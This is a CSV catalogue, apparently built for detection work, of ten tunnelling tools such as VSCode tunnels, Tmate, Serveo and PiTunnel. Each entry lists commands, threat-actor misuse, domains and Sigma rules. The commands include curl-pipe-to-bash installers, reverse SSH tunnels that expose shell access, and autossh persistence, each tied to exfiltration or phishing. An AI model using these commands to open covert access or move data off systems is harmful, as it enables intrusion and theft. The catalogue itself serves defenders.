"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_OperatingSystem","Full_Path","Full_Path_Path","Detection","Detection_Domain","Detection_URL","Detection_Sigma","Detection_Command","Resources","Resources_Link","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Custom_Domain","Full_Path_Filename","Custom_Domain_Supported_","Detection_Commands","Custom_Domain_Supported","is_legit"
"VSCode CLI","Utilizing Visual Studio Code Remote Tunnels for exposing local development environment over the internet.","Kamran Saifullah","2024-10-05","","[''code.exe tunnel --accept-server-license-terms''-|-''code.exe tunnel service install --accept-server-license-terms''-|-''Accessing generated Visual Studio Code Server Tunnels URL.''-|-''Shell Access via Visual Studio Code Server Tunnels.'']","[''Generating Visual Studio Code Server Tunnels via VSCode built in Tunneling functionality.''-|-''Generating Visual Studio Code Server Tunnels via VSCode built in Tunneling functionality and installing it as a service.''-|-''Insider threat, external threat actor will be accessing the link in the web browser providing access to the `vscode.dev\tunnels\*` proxying the local development environment.''-|-''Insider threat, external threat actor will be able to run commands on local system proxying via Microsoft domains using the built-in VSCode Server Terminal.'']","[''Generating Visual Studio Code Server Tunnels for exposing local dev environemnt over the internet.''-|-''Generating Visual Studio Code Server Tunnels for exposing local dev environemnt over the internet.''-|-''Accessing local files on VSCode Cloud for Data Exfiltration.''-|-''Accessing & Deleting files, executing payloads, downloading payloads, running malware/ransomware etc.'']","[''exfiltrate''-|-''exfiltrate''-|-''Access''-|-''shell-access'']","[''User''-|-''User''-|-''User''-|-''User'']","[''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux'']","","[''\%UserProfile%\vscode-cli\code_tunnel.json''-|-''code.exe (standalone executable)'']","","[''*.devtunnels.ms*''-|-''*.tunnels.api.visualstudio.com'']","https://vscode.dev/tunnel/*","https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_domain_devtunnels.yml","Execution of the binary with arguments.","","[''https://code.visualstudio.com/docs/remote/tunnels''-|-''https://cydefops.com/vscode-data-exfiltration''-|-''https://www.bleepingcomputer.com/news/security/chinese-hackers-use-visual-studio-code-tunnels-for-remote-access/'']","","[''Kamran Saifullah''-|-''Kirill Magaskin'']","[''@deFr0ggy''-|-''@k1rpi7ch'']","","","","","","false"
"VSCode GUI","Insiders as well as threat actors having GUI access to system can leverage this technique to create Visual Studio Remote Tunnel links to exfiltrate the data.","Kamran Saifullah","2024-10-05","","[''CTRL + SHIFT + P, Searching for Forward a port. Click on forward the port and provide a local port which is required to be exposed over the internet.''-|-''CTRL + SHIFT + P, Searching for Foreward a port, Click on forward the port and provide a local port on which a local server is running. An example, 'python -m http.server 8080'.''-|-''CTRL + SHIFT + P, Searching for Foreward a port, Click on forward the port and provide a local port on which a local server is running. An example, 'python -m http.server 8080'.'']","[''This will generate a microsoft tunnel link proxying the traffic to the local binded port.''-|-''Insider threat, external threat actor will be able to expose the local system over the internet and exfiltrate the sensitive files.''-|-''Threat actors can host malicious binaries/payloads locally and can use Microsoft Tunnels domains to download them onto the victim machine.'']","[''Exposing internal application on Microsoft Tunnels over the internet.''-|-''Accessing & exfiltrating the local files on VSCode Cloud for Data Exfiltration.''-|-''Downloading malicious binaries/payloads on victim system by hosting them locally.'']","[''Access''-|-''Exfiltrate''-|-''Download'']","[''User''-|-''User''-|-''User'']","[''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux'']","","Downloaded version of Visual Studio Code, which gets executed anywhere on the system.","","[''*.devtunnels.ms*''-|-''*.tunnels.api.visualstudio.com'']","","https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_domain_devtunnels.yml","","","https://valhalla.nextron-systems.com/info/sigma-rule/9501f8e6-8e3d-48fc-a8a6-1089dd5d7ef4","","[''Kamran Saifullah''-|-''Kirill Magaskin'']","[''@deFr0ggy''-|-''@k1rpi7ch'']","","","","","","false"
"TunnelTo","TunnelTo is free/subscription based tool which enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website.","Kamran Saifullah","2024-10-14","","[''tunnelto set-auth --key <AUTH KEY>''-|-''ssh -R 2222:localhost:22 tuns.sh''-|-''ssh -R 80:localhost:8080 tuns.sh''-|-''ssh -R 80:localhost:8080 tuns.sh''-|-''ssh -R 80:localhost:8080 tuns.sh'']","[''In order to install the TunnelTo, it can be done directly via cargo, brew etc. as well as downloadable binaries are provided that can be executed on the fly.''-|-''Exeuting the binary to generate a local tunnel by binding it to the local service running on TCP ports.''-|-''Executing the binary to generate a local tunnel by binding it to a local web server running on port 80.''-|-''Executing the binary to generate a local tunnel by binding it to the local file system exposed over port 80.''-|-''Executing the binary to generate a local tunnel by binding it to the local web server hosting phishing sites.'']","[''Installing/Downloading the tunnelto binaries to be executed on the local machine.''-|-''Exposing SSH/RDP etc over tunnels for shell-access''-|-''Exposing the local system over the tunnels for the files to be exfiltrated out of the organization.''-|-''Exposing the local web server/file system over the tunnels for the files to be exfiltrated out of the organization.''-|-''Exposing the local web server hosting phishing sites to target users.'']","[''install''-|-''shell-access''-|-''download''-|-''exfiltrate''-|-''phishing'']","[''User''-|-''User''-|-''User''-|-''User''-|-''User'']","[''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux'']","","Downloaded/Installed version of TunnelTo, which gets executed anywhere on the system.","","[''*.tuns.sh''-|-''*.ssi.sh''-|-''*.tunnelto.dev'']","","","Execution of installed/downloaded binary.","","https://docs.ssi.sh/","","Kamran Saifullah","@deFr0ggy","","","","","","false"
"Tmate","Tmate.io provides a simple binary to expose local terminal via tmate.io domains. These domains are accessible over the internet. Providing opportunity for insiders to expose local system, exfiltrate data, create backdoors via SSH etc.","Kamran Saifullah","2024-10-08","","[''tmate''-|-''tmate''-|-''tmate -F'']","[''This will generate instant tmate tunnel which is accessible via web browser as well as via SSH client. Insider threat or external threat actor can used this for accessing and monitoring the terminals using the read-only tunnel links.''-|-''This will generate instant tmate tunnel which is accessible via web browser as well as via SSH client. Insider threat or external threat actor can used this for data exfiltration.''-|-''This will generate instant tmate tunnel which is accessible via web browser as well as via SSH client. Insider threat or external threat actor can used this for backdoor as `-F` will foreground the current process.'']","[''Accessing the terminal via web browser or ssh remotely.''-|-''Exposing file system over the internet.''-|-''Maintaning access via Web or via SSH.'']","[''Access''-|-''exfiltrate''-|-''shell-access'']","[''User''-|-''User''-|-''User'']","[''Mac, Linux''-|-''Mac, Linux''-|-''Mac, Linux'']","","Downloaded/Installed version of tmate, which gets executed anywhere on the system.","","*.tmate.io","https://tmate.io/t/*","","Execution of the binary and/or with arguments.","","https://dfir.ch/posts/tmate_as_a_backdoor/","","Kamran Saifullah","@deFr0ggy","","","","","","false"
"Telebit","Telebit is an open source tool which enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website.","Kamran Saifullah","2024-10-14","","[''curl https://get.telebit.io/ | bash''-|-''telebit http <PORT>''-|-''telebit http <PORT>''-|-''telebit tcp <PORT>''-|-''telebit http <PORT>''-|-''telebit http <PORT>'']","[''Downloading and Installation of telebit on the local machine.''-|-''Binding telebit tunnels to the local port running on the machine to expose the local applications over the tunnels.''-|-''Running a local server in a directory and exposing it over the telebit tunnels for data exfiltration.''-|-''Binding telebit tunnels to the local SSH/RDP ports etc. for shell access.''-|-''Binding telebit tunnels to the local file system/web server and exposing malicious binaries to be downloaded onto the compromised host.''-|-''Binding telebit tunnels to the locally running phishing page to compromise users.'']","[''Downloading the telebit binary to be executed on the local machine.''-|-''Exposing local applications over the internet via telebit tunnels.''-|-''Exposing local file system via telebit tunnels for data exfiltration.''-|-''Exposing local ports over the internet via telebit tunnels for shell access.''-|-''Exposing locally hosted malicious binaries over the internet via telebit tunnels to be downloaded onto compromised host.''-|-''Exposing locally running phishing sites over the internet via telebit tunnels to compromise users.'']","[''install''-|-''Access''-|-''exfiltrate''-|-''shell-access''-|-''download''-|-''phishing'']","[''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User'']","[''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux'']","","Installed version/In memory execution of telebit.","","[''get.telebit.io''-|-''*.telebit.io''-|-''*.telebit.cloud''-|-''*.telebit.fun'']","","","Execution of the binary and/or with arguments.","","https://telebit.cloud/","","Kamran Saifullah","@deFr0ggy","","","","","","false"
"StaqLab","Staqlab enables insider threats and threat actors to create fake account on the website as there is no validation for account registration. In the Domains Section, threat actors can define dedicated tunnels subdomain name. Using the token for the authorization on the local system will enable them to connect to dynamically generated domains or else specified domains.","Kamran Saifullah","2024-10-06","","[''staqlab-tunnel.exe token=<AUTH TOKEN>''-|-''staqlab-tunnel.exe port=<PORT>''-|-''staqlab-tunnel.exe port=<PORT> domain=<DOMAIN>'']","[''This will register the local staqlab-tunnel.exe with the registered account.''-|-''This will create a tunnel to the port defined.''-|-''Exposing the local server running on local port over Staqlab Tunnels having static domain names defined in the dashboard. This can be used in Phishing Campaigns. However, the dynamically generated links can also be used for the same purpose.'']","[''Authenticating, generating and accessing the URL.''-|-''Exposing the local server running on local port over dynamic Staqlab Tunnels.''-|-''Exposing the local server running on local port over static Staqlab Tunnels.'']","[''Access''-|-''exfiltrate''-|-''Phishing'']","[''User''-|-''User''-|-''User'']","[''Windows, Mac, Linux, Raspberry Pi''-|-''Windows, Mac, Linux, Raspberry Pi''-|-''Windows, Mac, Linux, Raspberry Pi'']","","Downloaded version of Staqlab-tunnels.exe, which gets executed anywhere on the system.","","[''*.tunnel.staqlab.com''-|-''*.staqlab-tunnel.com''-|-''*.staqlab.com'']","https://tunnel.staqlab.com/inspector/*/inspector","","Execution of the binary and/or with arguments.","","","","Kamran Saifullah","@deFr0ggy","True","","","","","false"
"ShellHub","ShellHub is an online service/subscription based that enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website.","Kamran Saifullah","2024-10-13","","[''curl -sSf ""https://cloud.shellhub.io/install.sh?tenant_id=<TENANT ID>"" | sh''-|-''ShellHub Dashboard'']","[''Installating of ShellHub on the local system to be added as an approved device.''-|-''Accessing the local system via ShellHub dashboard. Requires to know the username and password or SSH private keys.'']","[''Executing the installation script to install ShellHub on the local system.''-|-''Knowing the credentials or SSH private key, users/threat actors can connect to the local terminal via ShellHub Cloud Terminal.'']","[''install''-|-''shell-access'']","[''User''-|-''User'']","[''Mac, Linux''-|-''Mac, Linux'']","","Installed ShellHub script/docker container, which gets executed anywhere on the system.","","*.shellhub.io*","","","Execution of the installation command.","","[''https://cloud.shellhub.io/''-|-''https://www.shellhub.io/'']","","Kamran Saifullah","@deFr0ggy","","","","","","false"
"Expose","Expose is an open source as well as subscription based tool which enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website.","Kamran Saifullah","2024-10-13","","[''curl https://github.com/beyondcode/expose/raw/master/builds/expose -L --output expose''-|-''composer global require beyondcode/expose''-|-''expose token <token>''-|-''expose default-server ap-1''-|-''expose share http://https://localhost:<LOCAL PORT>''-|-''expose share http://https://localhost:<LOCAL PORT>''-|-''expose share http://https://localhost:<LOCAL PORT>''-|-''expose share http://https://localhost:<LOCAL PORT> --server=<server>'']","[''Downloading and Installation of expose binary on the local system as a PHAR archive.''-|-''Downloading and Installation of expose binary on the local system.''-|-''Initiating the access via providing expose token.''-|-''Setting up default server via expose to connect to the nearest expose server.''-|-''Exposing the local server/services over the internet to be accessible over expose domains.''-|-''This can be used by threat actors to host malicious softwares/binaries on their local system and have it exposed via expose tunnels to be downloaded on the compromised system.''-|-''This can be used by threat actors to host phishing sites locally and expose them via expose tunnels to compromise users.''-|-''This can be used by threat actors to connect to the nearest expose server.'']","[''Downloading the expose binary to be executed on the local machine.''-|-''Downloading the expose binary to be executed on the local machine via composer.''-|-''Authenticating the session via expose token.''-|-''Connecting to the nearest expoe server for better bandwidth and connection stability.''-|-''Exposing the services running on localhost over the internet via expose tunnel domains.''-|-''Threat actors hosting malicious binaries and using the links to download them onto the compromised system.''-|-''Hosting phishing sites locally and exposing them over expose tunnels to compromise users.''-|-''Connecting to the nearest expose server in specific regions.'']","[''install''-|-''install''-|-''access''-|-''access''-|-''exfiltrate''-|-''download''-|-''phishing''-|-''access'']","[''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User'']","[''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux'']","","Installed version of expose binary/docker container, which gets executed anywhere on the system.","","[''*.sharedwithexpose.com''-|-''*.*.sharedwithexpose.com''-|-''*.eu-1.sharedwithexpose.com''-|-''*.us-1.sharedwithexpose.com''-|-''*.us-2.sharedwithexpose.com''-|-''*.ap-1.sharedwithexpose.com''-|-''*.in-1.sharedwithexpose.com''-|-''*.sa-1.sharedwithexpose.com''-|-''*.au-1.sharedwithexpose.com''-|-''*.eu-2.sharedwithexpose.com'']","","","Execution of the binary and/or with arguments.","","[''https://expose.dev/docs/getting-started/installation''-|-''https://github.com/beyondcode/expose'']","","Kamran Saifullah","@deFr0ggy","","","","","","false"
"Serveo","Serveo is an online free alternate to ngrok. Which can be used by the insiders as well as threat actors to expose local systems, services over the internet for data exfiltrations, downloading malicious softwares as well as hosting phishing pages.","Kamran Saifullah","2024-10-13","","[''ssh -R <PORT>:localhost:<PORT> serveo.net''-|-''wget *.serveo.net''-|-''ssh -R <PORT>:localhost:<PORT> serveo.net''-|-''autossh -M 0 -R <PORT>:localhost:<PORT> serveo.net'']","[''The command creates a tunnel via serveo to the local port provided in the command. This can be a local service or a web server running locally.''-|-''Threat actors can host malicious binaries on the local system and expose it via serveo.net and have those downloaded on the compromised host.''-|-''Threat actors can host phishing sites locally and can expose them via serveo.net to compromise users.''-|-''Threat actors enabling persistence on the compromised host to ensure system automatically gets connected to the serveo.net and can also provide shell access by exposing SSH/RDP etc.'']","[''Exposing local services/file system over the internet for data exfiltration.''-|-''Serving malicious binaries to be executed/downloaded on the compromised host.''-|-''Hosting phishing site locally and exposing it via serveo.net''-|-''Persisting local connections over serveo.net and/or exposing SSH/RDP for persistence.'']","[''exfiltrate''-|-''download''-|-''phishing''-|-''shell-access'']","[''User''-|-''User''-|-''User''-|-''User'']","[''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux''-|-''Windows, Mac, Linux'']","","Execution via command line. No need of installation.","","*.serveo.net","","","","","https://serveo.net/","","Kamran Saifullah","@deFr0ggy","","","","","","false"
"PiTunnel","PiTunnel is free/subscription based tool which enables connecting local systems to dataplicity cloud for remotely accessing them over the internet.","Kamran Saifullah","2024-10-14","","[''curl -s https://pitunnel.com/get/<TOKEN> | sudo bash''-|-''wget -qO- https://pitunnel.com/get/<TOKEN>> | sudo''-|-''pitunnel --port=<PORT> --name=vnc --persist'']","[''Having an account created on the website, it is possible to connect any system to the PiTunnel cloud and access it remotely, keeping access over tunnels.''-|-''Having an account created on the website, it is possible to connect any system to the PiTunnel cloud and access it remotely, for shell-access.''-|-''Having an account created on the website, it is possible to connect any system to the PiTunnel cloud and access it remotely, for data exfiltration.'']","[''Connecting the user machine to Pitunnl keeping access over tunnels.''-|-''Connecting the user machine to PiTunnel cloud for data exfiltration.''-|-''Connecting the user machine to PiTunnel cloud for data exfiltration.'']","[''Access''-|-''shell-access''-|-''exfiltrate'']","[''User''-|-''User''-|-''User'']","[''RaspberryPi''-|-''RaspberryPi''-|-''RaspberryPi'']","","Execution of pitunnel/bash command from anywhere on the system.","","*pitunnel.com","","","Execution of the command.","","https://www.pitunnel.com/","","Kamran Saifullah","@deFr0ggy","","","","","","false"
